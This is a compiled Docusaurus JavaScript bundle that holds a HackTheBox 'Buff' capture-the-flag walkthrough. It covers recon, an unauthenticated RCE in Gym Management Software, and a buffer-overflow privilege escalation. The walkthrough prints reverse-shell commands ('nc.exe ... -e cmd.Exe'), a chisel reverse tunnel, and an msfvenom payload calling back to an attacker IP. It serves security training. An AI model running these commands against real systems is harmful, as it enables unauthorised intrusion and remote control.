"use strict";(self.webpackChunk_4_m_1_d_0_n=self.webpackChunk_4_m_1_d_0_n||[]).push([[5580],{5494:(e,s,n)=>{n.r(s),n.d(s,{assets:()=>o,contentTitle:()=>c,default:()=>l,frontMatter:()=>r,metadata:()=>t,toc:()=>d});const t=JSON.parse('{"id":"HackTheBox/Buff","title":"TL;DR","description":"Ping","source":"@site/docs/HackTheBox/Buff.md","sourceDirName":"HackTheBox","slug":"/HackTheBox/Buff","permalink":"/docs/HackTheBox/Buff","draft":false,"unlisted":false,"editUrl":"https://github.com/facebook/docusaurus/tree/main/packages/create-docusaurus/templates/shared/docs/HackTheBox/Buff.md","tags":[],"version":"current","frontMatter":{},"sidebar":"tutorialSidebar","previous":{"title":"Table of Contents","permalink":"/docs/HackTheBox/table-of-contents"},"next":{"title":"Tutorial - Basics","permalink":"/docs/category/tutorial---basics"}}');var i=n(4848),a=n(8453);const r={},c="TL;DR",o={},d=[{value:"Ping",id:"ping",level:2},{value:"Nmap",id:"nmap",level:2},{value:"First 1000 TCP ports",id:"first-1000-tcp-ports",level:3},{value:"Web Server on port 8080",id:"web-server-on-port-8080",level:3},{value:"User Flag",id:"user-flag",level:2},{value:"Root Flag",id:"root-flag",level:2}];function h(e){const s={a:"a",code:"code",h1:"h1",h2:"h2",h3:"h3",header:"header",img:"img",p:"p",pre:"pre",...(0,a.R)(),...e.components};return(0,i.jsxs)(i.Fragment,{children:[(0,i.jsx)(s.header,{children:(0,i.jsx)(s.h1,{id:"tldr",children:"TL;DR"})}),"\n",(0,i.jsx)(s.p,{children:(0,i.jsx)(s.img,{src:n(1720).A+"",width:"2000",height:"2000"})}),"\n",(0,i.jsx)(s.h1,{id:"recon",children:"Recon"}),"\n",(0,i.jsx)(s.h2,{id:"ping",children:"Ping"}),"\n",(0,i.jsx)(s.p,{children:(0,i.jsx)(s.img,{src:n(5155).A+"",width:"480",height:"85"})}),"\n",(0,i.jsx)(s.p,{children:"We have a TTL of 127, which means it's likely a Windows machine."}),"\n",(0,i.jsx)(s.h2,{id:"nmap",children:"Nmap"}),"\n",(0,i.jsx)(s.h3,{id:"first-1000-tcp-ports",children:"First 1000 TCP ports"}),"\n",(0,i.jsx)(s.p,{children:(0,i.jsx)(s.img,{src:n(7539).A+"",width:"932",height:"283"})}),"\n",(0,i.jsx)(s.h3,{id:"web-server-on-port-8080",children:"Web Server on port 8080"}),"\n",(0,i.jsx)(s.p,{children:(0,i.jsx)(s.img,{src:n(7116).A+"",width:"1738",height:"942"})}),"\n",(0,i.jsx)(s.h1,{id:"enumeration",children:"Enumeration"}),"\n",(0,i.jsx)(s.p,{children:"After enumerating every page on the website"}),"\n",(0,i.jsx)(s.p,{children:(0,i.jsx)(s.img,{src:n(3094).A+"",width:"933",height:"273"})}),"\n",(0,i.jsx)(s.p,{children:'We found this framework : "Gym Management Software 1.0" in the contact.php page\r\nAfter some Googling, turns out it\'s vulnerable to an unauthenticated RCE'}),"\n",(0,i.jsx)(s.h1,{id:"exploitation",children:"Exploitation"}),"\n",(0,i.jsxs)(s.p,{children:["Using the ",(0,i.jsx)(s.a,{href:"https://www.exploit-db.com/exploits/48506",children:"PoC from exploit DB"})," we could get a remote shell"]}),"\n",(0,i.jsx)(s.p,{children:(0,i.jsx)(s.img,{src:n(5040).A+"",width:"516",height:"264"})}),"\n",(0,i.jsx)(s.p,{children:"after getting this non interactive shell, we have to transfer nc.exe in order to get a fully interactive shell, we use an smb share to get that done."}),"\n",(0,i.jsx)(s.pre,{children:(0,i.jsx)(s.code,{className:"language-plain",children:"# On attacker host\r\nmkdir /tmp/smbshare/\r\ncp nc.exe /tmp/smbshare/\r\nsudo impacket-smbserver share -smb2support /tmp/smbshare/ \r\n\r\n# On Windows victim machine\r\ncopy \\\\$IP\\share\\nc.exe\n"})}),"\n",(0,i.jsx)(s.p,{children:"After successfully copying the file, we can open a netcat listener and get a shell"}),"\n",(0,i.jsx)(s.pre,{children:(0,i.jsx)(s.code,{className:"language-plain",children:"## On attacker host\r\nnc -lvnp $PORT\r\n## On Windows victim \r\n.\\nc.exe $IP $PORT -e cmd.Exe\n"})}),"\n",(0,i.jsx)(s.p,{children:(0,i.jsx)(s.img,{src:n(1543).A+"",width:"1763",height:"1020"})}),"\n",(0,i.jsx)(s.h2,{id:"user-flag",children:"User Flag"}),"\n",(0,i.jsx)(s.p,{children:(0,i.jsx)(s.img,{src:n(4308).A+"",width:"445",height:"300"})}),"\n",(0,i.jsx)(s.h2,{id:"root-flag",children:"Root Flag"}),"\n",(0,i.jsx)(s.p,{children:"Enumerating every folder in shaun's home directory, i found this :"}),"\n",(0,i.jsx)(s.p,{children:(0,i.jsx)(s.img,{src:n(7997).A+"",width:"561",height:"237"})}),"\n",(0,i.jsxs)(s.p,{children:["Which is a file storage service that offers cloud storage, file synchronization and client software.\r\nAfter some googling, turns out there's a buffer overflow vulnerability in this version 1.11.2\r\n",(0,i.jsx)(s.img,{src:n(8615).A+"",width:"1557",height:"437"})]}),"\n",(0,i.jsx)(s.p,{children:"the PoC available for this exploit use Python, which is not installed on the victim windows machine, let's try and redirect the service back to our attacker machine\r\nFiguring out which prt it's using, i used netstat"}),"\n",(0,i.jsx)(s.p,{children:(0,i.jsx)(s.img,{src:n(8328).A+"",width:"804",height:"912"})}),"\n",(0,i.jsx)(s.p,{children:"It's using port 8888 (3306 is MySQL)\r\nWe could use SSH if we had credentials to shaun, but unfortunately we don't"}),"\n",(0,i.jsx)(s.pre,{children:(0,i.jsx)(s.code,{className:"language-bash",children:"ssh -L 8888:127.0.0.1:8080 shaun@buff.htb \n"})}),"\n",(0,i.jsxs)(s.p,{children:["Instead let's use a tool called ",(0,i.jsx)(s.a,{href:"https://github.com/jpillora/chisel",children:"Chisel"})," to create a tunnel\r\nJust like before, we need to transfer the executable to the windows machine, we'll use the same smb share as before"]}),"\n",(0,i.jsx)(s.pre,{children:(0,i.jsx)(s.code,{className:"language-plain",children:"## On ATTACKER\r\n./chisel server -p 8000 --reverse\r\n\r\n## On VICTIM\r\n.\\chisel.exe client 10.10.16.5:8000 R:8888:localhost:8888\n"})}),"\n",(0,i.jsx)(s.p,{children:(0,i.jsx)(s.img,{src:n(4610).A+"",width:"875",height:"285"})}),"\n",(0,i.jsxs)(s.p,{children:["After reading about the exploit, it's a buffer overflow, but we need to put in out own payload instead of the one in the ",(0,i.jsx)(s.a,{href:"https://www.exploit-db.com/exploits/48389",children:"PoC found on exploit DB"}),"\r\nLet's generate a payload using MSFVenom, a reverse tcp shell on port 1338"]}),"\n",(0,i.jsx)(s.pre,{children:(0,i.jsx)(s.code,{className:"language-shell",children:"msfvenom -p windows/exec CMD='C:\\xampp\\htdocs\\gym\\upload\\nc.exe 10.10.16.5 1338 -e powershell' -b '\\x00\\x0A\\x0D' -f python\r\n\r\n## Note: Given the four-byte addresses and \r\n## references to ESP and EIP (as opposed to RSP\r\n## and RIP), this is a 32-bit program.\n"})}),"\n",(0,i.jsx)(s.p,{children:(0,i.jsx)(s.img,{src:n(5867).A+"",width:"2233",height:"976"})}),"\n",(0,i.jsx)(s.p,{children:(0,i.jsx)(s.img,{src:n(1186).A+"",width:"2248",height:"1276"})}),"\n",(0,i.jsx)(s.p,{children:"Upon executing the script, we get a session as Administrator"})]})}function l(e={}){const{wrapper:s}={...(0,a.R)(),...e.components};return s?(0,i.jsx)(s,{...e,children:(0,i.jsx)(h,{...e})}):h(e)}},5155:(e,s,n)=>{n.d(s,{A:()=>t});const t=n.p+"assets/images/Pasted image 20240311165320-b59f258b12422d8b4496d867175267ac.png"},7116:(e,s,n)=>{n.d(s,{A:()=>t});const t=n.p+"assets/images/Pasted image 20240311165536-25794c3fb58cbaf7dc64d34579a92a8b.png"},7539:(e,s,n)=>{n.d(s,{A:()=>t});const t=n.p+"assets/images/Pasted image 20240311165557-0fb8b86babc9ff0f77af9e01b2eb38de.png"},3094:(e,s,n)=>{n.d(s,{A:()=>t});const t=n.p+"assets/images/Pasted image 20240311173032-3dfaacd1bc46d4ce57fbd5fba556c55e.png"},5040:(e,s,n)=>{n.d(s,{A:()=>t});const t=n.p+"assets/images/Pasted image 20240312005905-b4a60ce3d991d515f351cc00985f46b4.png"},1543:(e,s,n)=>{n.d(s,{A:()=>t});const t=n.p+"assets/images/Pasted image 20240312013651-d642ac0adfb5a311a53d949f4e89306d.png"},4308:(e,s,n)=>{n.d(s,{A:()=>t});const t=n.p+"assets/images/Pasted image 20240312013821-172bcbb765a3fc3b73b5db7760b77533.png"},7997:(e,s,n)=>{n.d(s,{A:()=>t});const t=n.p+"assets/images/Pasted image 20240312152051-fde76ee498e89e9613942e9e8e617413.png"},8615:(e,s,n)=>{n.d(s,{A:()=>t});const t=n.p+"assets/images/Pasted image 20240312152220-266d860cf94b5a5d6e09e37e6613176b.png"},8328:(e,s,n)=>{n.d(s,{A:()=>t});const t=n.p+"assets/images/Pasted image 20240312153937-5500ae2c4566b58b4bf61f5cd2a6b4c0.png"},4610:(e,s,n)=>{n.d(s,{A:()=>t});const t=n.p+"assets/images/Pasted image 20240312233254-56b7ba3f416d8b5bb8f22b641bc5b205.png"},1186:(e,s,n)=>{n.d(s,{A:()=>t});const t=n.p+"assets/images/Pasted image 20240313000350-1d49993a55e18d908490f0ccc3d66de5.png"},5867:(e,s,n)=>{n.d(s,{A:()=>t});const t=n.p+"assets/images/Pasted image 20240313000504-ff065d06ba8fdf07a9539b588ffa3e00.png"},1720:(e,s,n)=>{n.d(s,{A:()=>t});const t=n.p+"assets/images/tl;dr-614cbe462ebc6b0aac7e908a544e3485.png"},8453:(e,s,n)=>{n.d(s,{R:()=>r,x:()=>c});var t=n(6540);const i={},a=t.createContext(i);function r(e){const s=t.useContext(a);return t.useMemo((function(){return"function"==typeof e?e(s):{...s,...e}}),[s,e])}function c(e){let s;return s=e.disableParentContext?"function"==typeof e.components?e.components(i):e.components||i:r(e.components),t.createElement(a.Provider,{value:s},e.children)}}}]);